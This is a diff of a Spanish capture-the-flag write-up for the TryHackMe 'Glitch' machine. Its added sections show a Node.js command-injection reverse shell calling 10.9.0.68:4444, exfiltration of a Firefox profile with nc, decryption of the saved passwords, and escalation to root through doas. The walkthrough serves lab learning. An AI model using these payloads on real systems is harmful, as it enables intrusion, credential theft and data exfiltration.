@@ -55,7 +55,7 @@ ping -c 1 {ip}
 
 - De acuerdo con el escaneo anterior, se encuentran el siguiente puerto abierto; 80 (htp)
 
-- Escaeno de vulnerabilidades sobre los puerto 80:
+- Escaeno de vulnerabilidades sobre el 80:
 
 ```css
 nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
@@ -71,22 +71,27 @@ nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
 whatweb {ip}
 ```
 
-![what_web] (/assets/images/thm-writeup-glitch/glitch_whatweb.png)
+![nmap_allports](/assets/images/thm-writeup-glitch/glitch_whatweb.png)
 
 ---
 
 - Revisión de la URL **_<http://10.10.24.23>_**:
 
-![URL] (/assets/images/thm-writeup-glitch/glitch_web.png)
+![URL] (/assets/images/thm-writeup-glitch/glitch_nmap_vuln.png)
 
+---
 
 - Buscando el la ruta **_robots.txt_**, nos muestra lo siguiente:
 
 ![URL](/assets/images/thm-writeup-glitch/glitch_robots.png)
 
+- Revisando la petición anteriro en **burpsuite**:
+
+![URL](/assets/images/thm-writeup-glitch/glitch_burp_get.png)
+
 ---
 
-## 3. WFUZ
+## 2.1 WFUZ
 
 - Escaeno de subdominios con wfuzz:
 
@@ -101,7 +106,7 @@ whatweb {ip}
 
 ---
 
-## Gobuster
+## 2.2 Gobuster
 
 - Escaeno de subdominios con gobuster
 
@@ -111,31 +116,74 @@ gobuster -w /usr/share/dirb/wordlists/common.txt dir -u http://10.10.24.13 -x ht
 
 - Con el anterior escaner encotramos las páginas  **secret - img - js**
 
-## 5 Burpsuite
+## 2.3 Burpsuite
 
-- Realizamos la captura mediante burpsuite y nos encotramos con lo siguiente
+- Realizamos la del home captura mediante burpsuite y nos encotramos con lo siguiente
 
 ![Burp](/assets/images/thm-writeup-glitch/glitch_burp_home.png)
 
+---
+
+- Con la información obtenida en **gobuster** analizamos la solicitud de la ruta **secret**, la cual nos muestra un script con la siguiente ruta **/api/access**:
+
+![Burp](/assets/images/thm-writeup-glitch/glitch_burp_secret.png)
+
+- Realizamos la captura sobre la ruta de la captura anterior **/api/access/** y aca nos encontramos un token codificado en base 64, el cual procedemos a decodificar y con esta damos respuesta a la primera pregunta:
+
+![Burp](/assets/images/thm-writeup-glitch/glitch_burp_token.png)
+
+---
+
+![Burp](/assets/images/thm-writeup-glitch/glitch_burp_decodifica.png)
+
+---
+
+### 2.4 WFUZZ - 2
+
+- Realizamos otro escaneo sobre la ruta **api**, la cual nos entrega las siguientes rutas: **access, items, Access**:
+
+![Wfuzz](/assets/images/thm-writeup-glitch/glitch_wfuzz_2.png)
+
+- Con la información obtenida y sabiendo que recibe las respuestas vía **post**, procedemos a enviar el siguiente escaneo:
+
+```css
+# wfuzz -X POST -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hh=45 http://10.10.108.10/api/items?FUZZ=oops 
+```
+
+![Wfuzz](/assets/images/thm-writeup-glitch/glitch_wfuzz_3.png)
 
 
+
+### 2.5 Burpsuite - 2
+
+- De acuerdo con las rutas encontradas con el escaneo anterior y después de revisar diferentes posibilidades, modificamos el tipo de petición a **post** y nos encontramos con el mensaje: **"message":"there_is_a_glitch_in_the_matrix"**:
+
+![Burp](/assets/images/thm-writeup-glitch/glitch_burp_post.png)
+
+- Con base en la respuesta de la petición anterior se puede inferir que podemos inyectar código, procedemos a lanzar la siguiente petición para corroborar lo anterior: **POST /api/items?cmd=id HTTP/1.1**
+
+![Burp](/assets/images/thm-writeup-glitch/glitch_burp_post_id.png)
+
+
+### 3 Exploit
+
+- De acuerdo con la información obtenida en diferentes páginas de como executar una **Nodejs - simple reverse shell**, procedemos a ejecutarla desde **burpsuite**, antes de esto debemos ponernos en escucha por el puerto configurado **4444**.
+
+![nc](/assets/images/thm-writeup-glitch/glitch_nc.png)
+
+---
 
 ```css
 POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.9.0.68/4444+0>%261"') HTTP/1.1
-Host: 10.10.27.123
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Cookie: token=value
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 0
 ```
 
+![burp](/assets/images/thm-writeup-glitch/glitch_burp_exploit.png)
 
-### TAR Comprimir
+---
+
+### 3.1 TAR Comprimir
+
+- Investigando los archivos listados encontramos la carpeta **.firefox** la cual procedemos a comprimir con **tar** y a descargar con **nc**, con los siguientes comandos:
 
 ```css
 user@ubuntu:~$ tar -czvf .firefox
@@ -144,7 +192,7 @@ firefox.tar.gz  user.txt
 
 ```
 
-### Compartir archivo con nc
+### 3.2 Compartir archivo con nc
 
 ```css
 [Terminal atacante]
@@ -159,7 +207,7 @@ user@ubuntu:~$ nc -nv 10.9.0.68 3333 < firefox.tar.gz
 Connection to 10.9.0.68 3333 port [tcp/*] succeeded!
 ```
 
-### TAR descomprimir
+### 3.3 TAR descomprimir
 
 ```css
 └─# tar xvzf firefox.tar.gz 
@@ -175,11 +223,9 @@ Connection to 10.9.0.68 3333 port [tcp/*] succeeded!
 ...
 ```
 
-### Exploit
+### Exploit para descifar las contraseñas
 
-- Descargamos el exploit desde la siguiente página <https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py> lo guardamos con el nombre **exp.py** 
-
-- Lo ejecutamos con el siguiente comando y marcamos la opción **2** y de está manera obtenemos un usuario y contraseña:
+- Descargamos el exploit desde la siguiente página <https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py> lo guardamos con el nombre **exp.py**, o ejecutamos con el siguiente comando y marcamos la opción **2** y de está manera obtenemos un usuario y contraseña:
 
 ```css
 ─# python3 exp.py .firefox 
@@ -193,7 +239,8 @@ Username: 'v??????'
 Password: 'l??????'
 
 ```
-- Ingresamos con este usuario:
+
+- Ingresamos con el usuario y contraseña encontrados en el punto anterior:
 
 ```css
 user@ubuntu:~$ su v0id
@@ -202,8 +249,11 @@ Password: l??????
 v0id@ubuntu:/home/user$ 
 
 ```
+---
 
 ### Root
+
+- Con el siguiente comando procedemos a escanerar los binarios que pueden ser explotados y **doas** nos permite 
 
 ```css
 root@ubuntu:~# find / -type f -user root -perm -u=s 2>/dev/null
@@ -233,6 +283,10 @@ find / -type f -user root -perm -u=s 2>/dev/null
 root@ubuntu:~# 
 
 ```
+
+---
+
+- Ejecutamos el binario **doas** y podemos obtener acceso como root:
 
 ```css
 v0id@ubuntu:/home/user$  doas -u root /bin/bash
